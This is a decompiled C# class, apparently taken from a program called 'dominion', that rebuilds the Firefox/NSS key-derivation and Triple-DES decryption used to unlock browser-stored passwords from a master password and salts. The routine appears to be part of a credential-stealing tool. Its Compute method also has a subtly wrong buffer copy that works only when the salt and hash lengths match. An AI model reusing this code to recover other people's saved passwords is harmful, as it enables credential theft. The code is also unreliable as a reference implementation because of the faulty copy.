using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace dominion.src.dominion.Dependencies.Encryption
{
    internal class TripleDes
    {
        // Token: 0x1700003B RID: 59
        // (get) Token: 0x06000312 RID: 786 RVA: 0x00018513 File Offset: 0x00016713
        private byte[] CipherText { get; }

        // Token: 0x1700003C RID: 60
        // (get) Token: 0x06000313 RID: 787 RVA: 0x0001851B File Offset: 0x0001671B
        private byte[] GlobalSalt { get; }

        // Token: 0x1700003D RID: 61
        // (get) Token: 0x06000314 RID: 788 RVA: 0x00018523 File Offset: 0x00016723
        private byte[] MasterPassword { get; }

        // Token: 0x1700003E RID: 62
        // (get) Token: 0x06000315 RID: 789 RVA: 0x0001852B File Offset: 0x0001672B
        private byte[] EntrySalt { get; }

        // Token: 0x1700003F RID: 63
        // (get) Token: 0x06000316 RID: 790 RVA: 0x00018533 File Offset: 0x00016733
        // (set) Token: 0x06000317 RID: 791 RVA: 0x0001853B File Offset: 0x0001673B
        public byte[] Key { get; private set; }

        // Token: 0x17000040 RID: 64
        // (get) Token: 0x06000318 RID: 792 RVA: 0x00018544 File Offset: 0x00016744
        // (set) Token: 0x06000319 RID: 793 RVA: 0x0001854C File Offset: 0x0001674C
        public byte[] Vector { get; private set; }

        // Token: 0x0600031A RID: 794 RVA: 0x00018555 File Offset: 0x00016755
        public TripleDes(byte[] cipherText, byte[] globalSalt, byte[] masterPass, byte[] entrySalt)
        {
            this.CipherText = cipherText;
            this.GlobalSalt = globalSalt;
            this.MasterPassword = masterPass;
            this.EntrySalt = entrySalt;
        }

        // Token: 0x0600031B RID: 795 RVA: 0x0001857A File Offset: 0x0001677A
        public TripleDes(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt)
        {
            this.GlobalSalt = globalSalt;
            this.MasterPassword = masterPassword;
            this.EntrySalt = entrySalt;
        }

        // Token: 0x0600031C RID: 796 RVA: 0x00018598 File Offset: 0x00016798
        public void ComputeVoid()
        {
            SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
            byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
            Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
            byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
            byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
            Array.Copy(array2, 0, array3, 0, array2.Length);
            Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
            byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
            for (int i = this.EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hmacsha = new HMACSHA1(key))
            {
                array6 = hmacsha.ComputeHash(array5);
                byte[] array7 = hmacsha.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
                Array.Copy(array7, 0, array8, 0, array7.Length);
                Array.Copy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
                array9 = hmacsha.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            this.Key = new byte[24];
            for (int j = 0; j < this.Key.Length; j++)
            {
                this.Key[j] = array10[j];
            }
            this.Vector = new byte[8];
            int num = this.Vector.Length - 1;
            for (int k = array10.Length - 1; k >= array10.Length - this.Vector.Length; k--)
            {
                this.Vector[num] = array10[k];
                num--;
            }
        }

        // Token: 0x0600031D RID: 797 RVA: 0x000187E8 File Offset: 0x000169E8
        public byte[] Compute()
        {
            byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Buffer.BlockCopy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
            Buffer.BlockCopy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
            byte[] array2 = new SHA1Managed().ComputeHash(array);
            byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
            Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
            Buffer.BlockCopy(this.EntrySalt, 0, array3, this.EntrySalt.Length, array2.Length);
            byte[] key = new SHA1Managed().ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
            for (int i = this.EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hmacsha = new HMACSHA1(key))
            {
                array6 = hmacsha.ComputeHash(array5);
                byte[] array7 = hmacsha.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
                Buffer.BlockCopy(array7, 0, array8, 0, array7.Length);
                Buffer.BlockCopy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
                array9 = hmacsha.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            this.Key = new byte[24];
            for (int j = 0; j < this.Key.Length; j++)
            {
                this.Key[j] = array10[j];
            }
            this.Vector = new byte[8];
            int num = this.Vector.Length - 1;
            for (int k = array10.Length - 1; k >= array10.Length - this.Vector.Length; k--)
            {
                this.Vector[num] = array10[k];
                num--;
            }
            Array sourceArray = TripleDes.DecryptByteDesCbc(this.Key, this.Vector, this.CipherText);
            byte[] array11 = new byte[24];
            Array.Copy(sourceArray, array11, array11.Length);
            return array11;
        }

        // Token: 0x0600031E RID: 798 RVA: 0x00018A6C File Offset: 0x00016C6C
        public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            string result;
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            result = streamReader.ReadToEnd();
                        }
                    }
                }
            }
            return result;
        }

        // Token: 0x0600031F RID: 799 RVA: 0x00018B34 File Offset: 0x00016D34
        public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            byte[] array = new byte[512];
            byte[] result;
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        cryptoStream.Read(array, 0, array.Length);
                        result = array;
                    }
                }
            }
            return result;
        }
    }
}
